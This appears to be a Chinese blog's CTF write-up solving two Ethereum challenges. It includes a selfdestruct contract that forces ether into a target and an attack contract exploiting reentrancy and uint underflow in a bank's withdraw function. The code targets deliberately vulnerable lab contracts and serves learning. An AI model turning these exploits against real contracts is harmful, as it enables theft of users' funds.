@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>NewStarCTF Blockchain Week4 wp - zealot&#039;s blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="zealot&#039;s blog"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="zealot&#039;s blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="两道关于自毁转账和重入攻击的题目。"><meta property="og:type" content="article"><meta property="og:title" content="NewStarCTF Blockchain Week4 wp"><meta property="og:url" content="https://litao6666.github.io/202210/b48e4a69.html"><meta property="og:site_name" content="zealot&#039;s blog"><meta property="og:description" content="两道关于自毁转账和重入攻击的题目。"><meta property="og:locale" content="en_US"><meta property="article:published_time" content="2022-10-17T13:51:32.000Z"><meta property="article:modified_time" content="2022-10-17T14:38:29.786Z"><meta property="article:author" content="zealot"><meta property="article:tag" content="self destruct"><meta property="article:tag" content="Reentrancy Attack"><meta property="twitter:card" content="summary"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://litao6666.github.io/202210/b48e4a69.html"},"headline":"zealot's blog","image":[],"datePublished":"2022-10-17T13:51:32.000Z","dateModified":"2022-10-17T14:38:29.786Z","author":{"@type":"Person","name":"zealot"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject"}},"description":"两道关于自毁转账和重入攻击的题目。"}</script><link rel="canonical" href="https://litao6666.github.io/202210/b48e4a69.html"><meta name="referrer" content="no-referrer"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.2/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/js/globalUtils.min.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdnjs.loli.net/ajax/libs/pace/1.2.4/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/live2d/waifu.min.css"><script type="text/javascript" async src="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/live2d/autoload.min.js"></script><meta name="generator" content="Hexo 6.0.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">zealot&#039;s blog</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/LittleYe233/hexo-theme-amazingremake"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/js/theme-setting.min.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2022-10-17  <span class="level-item"><i class="far fa-clock"> </i>7 m  <i class="fas fa-pencil-alt"> </i>1.0 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>&nbsp;visits</span></div></div><h1 class="title is-3 is-size-4-mobile">NewStarCTF Blockchain Week4 wp</h1><div class="content"><p>两道关于自毁转账和重入攻击的题目。</p>
+<span id="more"></span>
+<h2 id="demolition-trucks">Demolition Trucks</h2>
+<p>题目合约源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract Trucks &#123;</span><br><span class="line">    constructor() public&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event isSolved();</span><br><span class="line"></span><br><span class="line">    function getBalance() public view returns (uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public returns (bool)&#123;</span><br><span class="line">        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;</span><br><span class="line">        require(address(this).balance&gt;0);</span><br><span class="line">        emit isSolved();</span><br><span class="line">        _to.transfer(address(this).balance);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>题目要求合约地址的balance大于0，而我们通过题目系统创建的合约初始ether是为0的。一开始以为直接向合约里转一点ether就好，然而交易总是失败。上网查了会儿才知道合约接收转账需要payable
+fallback函数。题目合约里没有，这条路也就行不通了。</p>
+<p>然后猜想题目名“自爆卡车”会不会是提示，搜了一会儿发现确实有一种自毁转账的方法。通过合约自毁强行给目标合约地址转账。</p>
+<p>自毁方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract burn &#123;</span><br><span class="line"></span><br><span class="line">	function kill() public payable &#123;</span><br><span class="line">    	selfdestruct(address(0xD2933ff4797D3e97240002F501eC2985047a9930));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里address是接收转账的目标合约地址。将以上合约进行部署，并调用kill函数。</p>
+<p><img
+src="https://cdn.jsdelivr.net/gh/litao6666/PicGoRepo/image/202210102228409.png" /></p>
+<p>可以看到题目合约上确实多了一点ether</p>
+<p><img
+src="https://cdn.jsdelivr.net/gh/litao6666/PicGoRepo/image/202210102228380.png" /></p>
+<p>然后直接调用题目合约中的payforflag即可。</p>
+<h2 id="baby-bank">baby bank</h2>
+<p>合约源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">contract Bank&#123;</span><br><span class="line">    mapping (address =&gt; uint) public balance;</span><br><span class="line">    event Received(address Sender, uint Value);</span><br><span class="line">    event isSolved();</span><br><span class="line">    uint public chance;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        chance = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() external payable &#123;</span><br><span class="line">        emit Received(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gift() public &#123;</span><br><span class="line">        require(chance==1);</span><br><span class="line">        balance[msg.sender] = 2;</span><br><span class="line">        chance=0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint amount) public&#123;</span><br><span class="line">        require(amount==2);</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">        balance[msg.sender] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public &#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= 10000000000);</span><br><span class="line">        balance[msg.sender]=0;</span><br><span class="line">        chance=1;</span><br><span class="line">        emit isSolved();</span><br><span class="line">        address _to = 0x498d4BAddD959314591Dc14cb10790e8Df68b1b1;</span><br><span class="line">        _to.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>withdraw函数存在<a
+target="_blank" rel="noopener" href="https://ctf-wiki.org/blockchain/ethereum/attacks/re-entrancy/">重入攻击漏洞</a>。函数中先进行转账，后对变量的值进行修改。而如果转账的目标是一个合约地址，则会调用合约中的fallback函数，而攻击者则可以通过自己编写的fallback函数反复调用bank中的withdraw从而取走bank中的所有钱。</p>
+<p>然而在本题中，我们的目标是使得调用者在bank中的balance为一个很大的值。这里可以借助withdraw函数中存在的下溢出漏洞完成。balance通过gift初始化为2，每次调用withdraw会减2，第二次调用时由于uint无符号数的特性，0-2会下溢出成一个很大的正数，从而能通过目标函数的检查。</p>
+<p>该题操作过程如下。</p>
+<p>首先在系统中获取目标合约（也就是被攻击的bank）地址，该合约初始是没有ether的，我们需要借助上一题里自毁的方法（操作过程见上题，不再赘述）向该合约中转一点币以保证后面转账能够顺利进行。</p>
+<p>然后编写攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.23;</span><br><span class="line"></span><br><span class="line">import &quot;./Example.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line">    Bank b;</span><br><span class="line">    bool tag;</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        b=Bank(0x81d99556781BAD40ab1A56a9b84d9fE5a3a3f91A);</span><br><span class="line">        tag=false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">        b.gift();</span><br><span class="line">        b.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag() public&#123;</span><br><span class="line">        b.payforflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public payable&#123;</span><br><span class="line">        require(tag==false);</span><br><span class="line">        tag=true;</span><br><span class="line">        b.withdraw(2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该合约中，攻击通过attack实施。先调用gift初始化bank中的balance为2，然后调用withdraw，在withdraw的转账过程中会默认调用攻击合约的fallback函数（也就是合约中无函数名的函数），从而再次withdraw重入。合约中使用了tag限制重入次数为2，即下溢出后就中止调用。</p>
+<p>部署该攻击合约，调用attack，成功后可在bank中查到攻击合约的balance已经下溢出为一个很大的数了（实际上为<span
+class="math inline">\(2^{256}-2\)</span>）。</p>
+<p><img
+src="https://cdn.jsdelivr.net/gh/litao6666/PicGoRepo/image/202210172149242.png" /></p>
+<p>最后调用攻击合约中的getflag即可。将交易hash提交到系统中获取flag。</p>
+<p><img
+src="https://cdn.jsdelivr.net/gh/litao6666/PicGoRepo/image/202210172149286.png" /></p>
+</div><div class="article-licensing box"><div class="licensing-title"><p>NewStarCTF Blockchain Week4 wp</p><p><a href="https://litao6666.github.io/202210/b48e4a69.html">https://litao6666.github.io/202210/b48e4a69.html</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><a href="https://litao6666.github.io"><p>zealot</p></a></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2022-10-17</p></div></div><div class="level-item is-narrow"><div><h6>Updated on</h6><p>2022-10-17</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="icon" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a><a class="icon" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="recommend-area"><div class="recommend-post"><span class="is-size-6 has-text-grey has-mr-7"># Related Posts</span><br><span>  1.<a class="is-size-6" href="/202210/295972d0.html" target="_blank" rel="noreferrer">NewStarCTF Blockchain Week3 wp</a><br></span></div></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/202211/eb902975.html"><i class="level-item fas fa-chevron-left"></i><span class="level-item">N1CTF2022 Crypto赛题复现</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/202210/295972d0.html"><span class="level-item">NewStarCTF Blockchain Week3 wp</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1 is-sticky"><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">Catalogue</h3><ul class="menu-list"><li><a class="is-flex is-mobile" href="#demolition-trucks"><span>Demolition Trucks</span></a></li><li><a class="is-flex is-mobile" href="#baby-bank"><span>baby bank</span></a></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="column-right-shadow is-hidden-widescreen"></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">zealot&#039;s blog</a><p class="size-small"><span>&copy; 2023 zealot</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noreferrer">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noreferrer">Icarus</a> &amp; <a href="https://github.com/LittleYe233/hexo-theme-amazingremake" target="_blank" rel="noreferrer">Amazing-Remake</a> <br><span>© 版权说明：[本网站所有内容均收集于互联网或自己创作,<br />&nbsp;&nbsp;&nbsp;&nbsp;方便于网友与自己学习交流，如有侵权，请<a href="/message" target="_blank">留言</a>，立即处理]<br /></span><div class="size-small"><span>❤️Thx <strong><span id="busuanzi_value_site_uv">99+</span></strong> users <strong><span id="busuanzi_value_site_pv">99+</span></strong> visited!❤️</span></div></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/LittleYe233/hexo-theme-amazingremake"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" async></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    enabled: true,
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script src="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/js/column.min.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><script type="text/x-mathjax-config">MathJax.Hub.Config({
+            'HTML-CSS': {
+                matchFontHeight: false
+            },
+            SVG: {
+                matchFontHeight: false
+            },
+            CommonHTML: {
+                matchFontHeight: false
+            },
+            tex2jax: {
+                inlineMath: [
+                    ['$','$'],
+                    ['\\(','\\)']
+                ]
+            }
+        });</script><script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.9/MathJax.js?config=TeX-MML-AM_CHTML" defer></script><!--!--><script src="https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/js/main.min.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
+        });</script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script><script type="text/javascript">var pjax = new Pjax({
+            elements: "a",//代表点击链接就更新
+            selectors: [  //代表要更新的节点
+                ".section",
+                "title"
+            ],
+            cache: true,
+            cacheBust:false
+        })
+
+        function loadBusuanzi(){
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js", function () {});
+        }
+
+        function loadMathJax() { // 加载mathjax
+            window.MathJax = {
+                tex: {
+                    inlineMath: [['$', '$']],
+                    autoload: {
+                        color: [],
+                        colorv2: ['color']
+                    },
+                    packages: {'[+]': ['noerrors']}
+                },
+                options: {
+                    ignoreHtmlClass: 'tex2jax_ignore',
+                    processHtmlClass: 'tex2jax_process'
+                },
+                loader: {
+                    load: ['input/asciimath', '[tex]/noerrors']
+                }
+            };
+            $.getScript('//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js');
+        };
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+        });
+        
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+            $(".section").css({opacity:1});
+            if(false){
+                $.getScript('https://cdn.jsdelivr.net/gh/litao6666/litao6666.github.io/js/comment-issue-data.min.js',function(){loadIssueData('','','','',false);});
+            }
+            if('undefined' === 'mathjax'){
+                loadMathJax();
+            }
+            loadMainJs(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings);
+            loadBackTop();
+            loadBusuanzi();
+            if(typeof loadBanner == 'function'){
+                loadBanner();
+            }
+        });</script></body></html>
